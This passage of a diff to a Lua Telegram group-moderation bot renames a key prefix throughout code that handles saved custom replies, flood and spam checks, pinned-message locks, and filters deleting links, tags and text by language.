+DevALI:del(JENRAL..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'DelManagerRep'..msg.chat_id_)
 return false
 end
-DevALI:del(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
-local SaveGpRed = DevALI:get(Jenral..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
-if msg.content_.video_ then DevALI:set(Jenral..'ALI:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local SaveGpRed = DevALI:get(JENRAL..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
+if msg.content_.video_ then DevALI:set(JENRAL..'ALI:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
 end
-if msg.content_.document_ then DevALI:set(Jenral..'ALI:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
+if msg.content_.document_ then DevALI:set(JENRAL..'ALI:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
 end
-if msg.content_.sticker_ then DevALI:set(Jenral..'ALI:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
+if msg.content_.sticker_ then DevALI:set(JENRAL..'ALI:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
 end 
-if msg.content_.voice_ then DevALI:set(Jenral..'ALI:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
+if msg.content_.voice_ then DevALI:set(JENRAL..'ALI:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
 end
-if msg.content_.audio_ then DevALI:set(Jenral..'ALI:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
+if msg.content_.audio_ then DevALI:set(JENRAL..'ALI:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
 end
 if msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -2272,47 +2272,47 @@ end
 if msg.content_.photo_.sizes_[3] then
 photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
-DevALI:set(Jenral..'ALI:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
+DevALI:set(JENRAL..'ALI:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
 end
-if msg.content_.animation_ then DevALI:set(Jenral..'ALI:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
+if msg.content_.animation_ then DevALI:set(JENRAL..'ALI:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
 end 
 if msg.content_.text_ then
-DevALI:set(Jenral..'ALI:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
+DevALI:set(JENRAL..'ALI:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
 end 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
-DevALI:del(Jenral..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
-DevALI:del(Jenral..'DelManagerRep'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'DelManagerRep'..msg.chat_id_)
 return false 
 end 
 end
-if msg.content_.text_ and not DevALI:get(Jenral..'ALI:Lock:GpRed'..msg.chat_id_) then 
-if DevALI:get(Jenral..'ALI:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(Jenral..'ALI:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if msg.content_.text_ and not DevALI:get(JENRAL..'ALI:Lock:GpRed'..msg.chat_id_) then 
+if DevALI:get(JENRAL..'ALI:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(JENRAL..'ALI:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end 
-if DevALI:get(Jenral..'ALI:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(Jenral..'ALI:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevALI:get(JENRAL..'ALI:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(JENRAL..'ALI:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end 
-if DevALI:get(Jenral..'ALI:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral..'ALI:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevALI:get(JENRAL..'ALI:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL..'ALI:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end
-if DevALI:get(Jenral..'ALI:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral..'ALI:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevALI:get(JENRAL..'ALI:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL..'ALI:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end
-if DevALI:get(Jenral..'ALI:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral..'ALI:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevALI:get(JENRAL..'ALI:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL..'ALI:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end
-if DevALI:get(Jenral..'ALI:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral..'ALI:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
+if DevALI:get(JENRAL..'ALI:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL..'ALI:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
 end 
-if DevALI:get(Jenral..'ALI:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
-sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(Jenral..'ALI:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
+if DevALI:get(JENRAL..'ALI:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
+sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(JENRAL..'ALI:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
 end
-if DevALI:get(Jenral..'ALI:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
-function JenralTEAM(extra,result,success)
+if DevALI:get(JENRAL..'ALI:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
+function JENRALTEAM(extra,result,success)
 if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
-local edit_msg = DevALI:get(Jenral..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local Text = DevALI:get(Jenral..'ALI:Text:GpRed'..msg.content_.text_..msg.chat_id_)
+local edit_msg = DevALI:get(JENRAL..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local Text = DevALI:get(JENRAL..'ALI:Text:GpRed'..msg.content_.text_..msg.chat_id_)
 local Text = Text:gsub('#username',(username or 'لا يوجد')) 
 local Text = Text:gsub('#name','['..result.first_name_..']')
 local Text = Text:gsub('#id',msg.sender_user_id_)
@@ -2321,39 +2321,39 @@ local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
 local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
 send(msg.chat_id_,msg.id_,Text)
 end
-getUser(msg.sender_user_id_, JenralTEAM)
+getUser(msg.sender_user_id_, JENRALTEAM)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 text = msg.content_.text_
 if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
-local SaveAllRed = DevALI:get(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_)
+local SaveAllRed = DevALI:get(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_)
 if SaveAllRed == 'SaveAllRed' then
 if text == 'الغاء' then
-local DelSudoRep = DevALI:get(Jenral..'DelSudoRep')
-DevALI:del(Jenral.."ALI:Sudo:AllRed",DelSudoRep)
+local DelSudoRep = DevALI:get(JENRAL..'DelSudoRep')
+DevALI:del(JENRAL.."ALI:Sudo:AllRed",DelSudoRep)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
-DevALI:del(Jenral.."ALI:Add:AllText"..msg.sender_user_id_)
-DevALI:del(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_)
-DevALI:del(Jenral.."DelSudoRep")
+DevALI:del(JENRAL.."ALI:Add:AllText"..msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_)
+DevALI:del(JENRAL.."DelSudoRep")
 return false
 end
-DevALI:del(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_)
-local SaveAllRed = DevALI:get(Jenral.."ALI:Add:AllText"..msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_)
+local SaveAllRed = DevALI:get(JENRAL.."ALI:Add:AllText"..msg.sender_user_id_)
 if msg.content_.video_ then
-DevALI:set(Jenral.."ALI:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
+DevALI:set(JENRAL.."ALI:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
 end
 if msg.content_.document_ then
-DevALI:set(Jenral.."ALI:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
+DevALI:set(JENRAL.."ALI:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
 end
 if msg.content_.sticker_ then
-DevALI:set(Jenral.."ALI:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
+DevALI:set(JENRAL.."ALI:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
 end
 if msg.content_.voice_ then
-DevALI:set(Jenral.."ALI:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
+DevALI:set(JENRAL.."ALI:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
 end
 if msg.content_.audio_ then
-DevALI:set(Jenral.."ALI:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
+DevALI:set(JENRAL.."ALI:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
 end
 if msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -2368,46 +2368,46 @@ end
 if msg.content_.photo_.sizes_[3] then
 photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
-DevALI:set(Jenral.."ALI:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
+DevALI:set(JENRAL.."ALI:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
 end
 if msg.content_.animation_ then
-DevALI:set(Jenral.."ALI:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
+DevALI:set(JENRAL.."ALI:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
 end
 if msg.content_.text_ then
-DevALI:set(Jenral.."ALI:Text:AllRed"..SaveAllRed, msg.content_.text_)
+DevALI:set(JENRAL.."ALI:Text:AllRed"..SaveAllRed, msg.content_.text_)
 end 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
-DevALI:del(Jenral.."ALI:Add:AllText"..msg.sender_user_id_)
-DevALI:del(Jenral..'DelSudoRep')
+DevALI:del(JENRAL.."ALI:Add:AllText"..msg.sender_user_id_)
+DevALI:del(JENRAL..'DelSudoRep')
 return false end end
-if msg.content_.text_ and not DevALI:get(Jenral..'ALI:Lock:AllRed'..msg.chat_id_) then
-if DevALI:get(Jenral.."ALI:Video:AllRed"..msg.content_.text_) then
-sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(Jenral.."ALI:Video:AllRed"..msg.content_.text_))
+if msg.content_.text_ and not DevALI:get(JENRAL..'ALI:Lock:AllRed'..msg.chat_id_) then
+if DevALI:get(JENRAL.."ALI:Video:AllRed"..msg.content_.text_) then
+sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(JENRAL.."ALI:Video:AllRed"..msg.content_.text_))
 end
-if DevALI:get(Jenral.."ALI:File:AllRed"..msg.content_.text_) then
-sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(Jenral.."ALI:File:AllRed"..msg.content_.text_))
+if DevALI:get(JENRAL.."ALI:File:AllRed"..msg.content_.text_) then
+sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(JENRAL.."ALI:File:AllRed"..msg.content_.text_))
 end
-if DevALI:get(Jenral.."ALI:Voice:AllRed"..msg.content_.text_)  then
-sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral.."ALI:Voice:AllRed"..msg.content_.text_))
+if DevALI:get(JENRAL.."ALI:Voice:AllRed"..msg.content_.text_)  then
+sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL.."ALI:Voice:AllRed"..msg.content_.text_))
 end
-if DevALI:get(Jenral.."ALI:Audio:AllRed"..msg.content_.text_)  then
-sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral.."ALI:Audio:AllRed"..msg.content_.text_))
+if DevALI:get(JENRAL.."ALI:Audio:AllRed"..msg.content_.text_)  then
+sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL.."ALI:Audio:AllRed"..msg.content_.text_))
 end
-if DevALI:get(Jenral.."ALI:Photo:AllRed"..msg.content_.text_)  then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral.."ALI:Photo:AllRed"..msg.content_.text_))
+if DevALI:get(JENRAL.."ALI:Photo:AllRed"..msg.content_.text_)  then
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL.."ALI:Photo:AllRed"..msg.content_.text_))
 end
-if  DevALI:get(Jenral.."ALI:Gif:AllRed"..msg.content_.text_) then
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(Jenral.."ALI:Gif:AllRed"..msg.content_.text_))
+if  DevALI:get(JENRAL.."ALI:Gif:AllRed"..msg.content_.text_) then
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALI:get(JENRAL.."ALI:Gif:AllRed"..msg.content_.text_))
 end
-if DevALI:get(Jenral.."ALI:Stecker:AllRed"..msg.content_.text_) then
-sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(Jenral.."ALI:Stecker:AllRed"..msg.content_.text_))
+if DevALI:get(JENRAL.."ALI:Stecker:AllRed"..msg.content_.text_) then
+sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALI:get(JENRAL.."ALI:Stecker:AllRed"..msg.content_.text_))
 end
-if DevALI:get(Jenral.."ALI:Text:AllRed"..msg.content_.text_) then
-function JenralTEAM(extra,result,success)
+if DevALI:get(JENRAL.."ALI:Text:AllRed"..msg.content_.text_) then
+function JENRALTEAM(extra,result,success)
 if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
-local edit_msg = DevALI:get(Jenral..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local Text = DevALI:get(Jenral.."ALI:Text:AllRed"..msg.content_.text_)
+local edit_msg = DevALI:get(JENRAL..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local Text = DevALI:get(JENRAL.."ALI:Text:AllRed"..msg.content_.text_)
 local Text = Text:gsub('#username',(username or 'لا يوجد')) 
 local Text = Text:gsub('#name','['..result.first_name_..']')
 local Text = Text:gsub('#id',msg.sender_user_id_)
@@ -2416,10 +2416,10 @@ local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
 local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
 send(msg.chat_id_,msg.id_,Text)
 end
-getUser(msg.sender_user_id_, JenralTEAM)
+getUser(msg.sender_user_id_, JENRALTEAM)
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 --       Spam Send        --
 function NotSpam(msg,Type)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
@@ -2445,9 +2445,9 @@ if Type == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
 return false  
 end 
-if Type == "keed" and not DevALI:sismember(Jenral..'ALI:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
+if Type == "keed" and not DevALI:sismember(JENRAL..'ALI:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
 my_ide = msg.sender_user_id_
 msgm = msg.id_
 local num = 100
@@ -2463,8 +2463,8 @@ Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار ال�
 SendText(msg.chat_id_,Text,0,'md')
 return false  
 end  
-if Type == "mute" and not DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_, msg.sender_user_id_) then
-DevALI:sadd(Jenral..'ALI:Muted:'..msg.chat_id_,msg.sender_user_id_)
+if Type == "mute" and not DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_, msg.sender_user_id_) then
+DevALI:sadd(JENRAL..'ALI:Muted:'..msg.chat_id_,msg.sender_user_id_)
 my_ide = msg.sender_user_id_
 msgm = msg.id_
 local num = 100
@@ -2482,32 +2482,32 @@ return false
 end
 end,nil)
 end  
---  end functions Jenral --
---     Source Jenral     --
+--  end functions JENRAL --
+--     Source JENRAL     --
 --       Spam Check       --
-if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
-if msg.sender_user_id_ ~= Jenral then
-floods = DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
-Num_Msg_Max = DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
-Time_Spam = DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
-local post_count = tonumber(DevALI:get(Jenral.."ALI:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
-if post_count > tonumber(DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
+if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
+if msg.sender_user_id_ ~= JENRAL then
+floods = DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
+Num_Msg_Max = DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
+Time_Spam = DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
+local post_count = tonumber(DevALI:get(JENRAL.."ALI:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
+if post_count > tonumber(DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
 local ch = msg.chat_id_
-local type = DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") 
+local type = DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Spam:User") 
 NotSpam(msg,type)  
 end
-DevALI:setex(Jenral.."ALI:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
+DevALI:setex(JENRAL.."ALI:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
 local edit_id = data.text_ or "nil"  
 Num_Msg_Max = 5
-if DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
-Num_Msg_Max = DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
+if DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
+Num_Msg_Max = DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
 end
-if DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
-Time_Spam = DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
+if DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
+Time_Spam = DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
 end 
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 ----- START MSG CHECKS -----
 if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
 ChatKick(msg.chat_id_, msg.sender_user_id_)
@@ -2528,151 +2528,151 @@ DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 if msg.content_.ID == "MessagePinMessage" then
-if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(Jenral) then
-DevALI:set(Jenral..'ALI:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
+if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(JENRAL) then
+DevALI:set(JENRAL..'ALI:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
 else
-local pin_id = DevALI:get(Jenral..'ALI:PinnedMsg'..msg.chat_id_)
-if pin_id and DevALI:get(Jenral..'ALI:Lock:Pin'..msg.chat_id_) then
+local pin_id = DevALI:get(JENRAL..'ALI:PinnedMsg'..msg.chat_id_)
+if pin_id and DevALI:get(JENRAL..'ALI:Lock:Pin'..msg.chat_id_) then
 pinmsg(msg.chat_id_,pin_id,0)
 end
 end
 end
-if DevALI:get(Jenral..'ALI:viewget'..msg.sender_user_id_) then
+if DevALI:get(JENRAL..'ALI:viewget'..msg.sender_user_id_) then
 if not msg.forward_info_ then
-DevALI:del(Jenral..'ALI:viewget'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:viewget'..msg.sender_user_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
-DevALI:del(Jenral..'ALI:viewget'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:viewget'..msg.sender_user_id_)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         Photo          --
 if msg.content_.ID == "MessagePhoto" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Photo'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Photo'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --        Markdown        --
 elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
-if DevALI:get(Jenral..'ALI:Lock:Markdown'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Markdown'..msg.chat_id_) then
 if not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --        Document        --
 elseif msg.content_.ID == "MessageDocument" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevALI:get(Jenral..'ALI:Lock:Document'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Document'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
